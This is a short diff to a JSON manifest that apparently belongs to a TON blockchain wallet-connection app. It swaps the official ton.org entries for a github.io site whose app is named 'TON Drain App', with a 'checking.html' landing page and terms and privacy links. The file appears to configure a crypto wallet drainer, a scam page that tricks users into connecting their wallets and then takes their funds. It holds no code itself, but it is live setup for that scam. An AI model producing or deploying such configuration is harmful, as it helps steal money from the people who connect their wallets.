@@ -1,5 +1,7 @@
 {
-    "url": "https://ton.org", 
-    "name": "Ton", 
-    "iconUrl": "https://ton.org/logo.png" 
-} 
+    "url": "https://leonardokotu.github.io/mysite/checking.html",
+    "name": "TON Drain App",
+    "iconUrl": "https://leonardokotu.github.io/mysite/icon.png",
+    "termsOfUseUrl": "https://leonardokotu.github.io/mysite/terms",
+    "privacyPolicyUrl": "https://leonardokotu.github.io/mysite/privacy"
+}
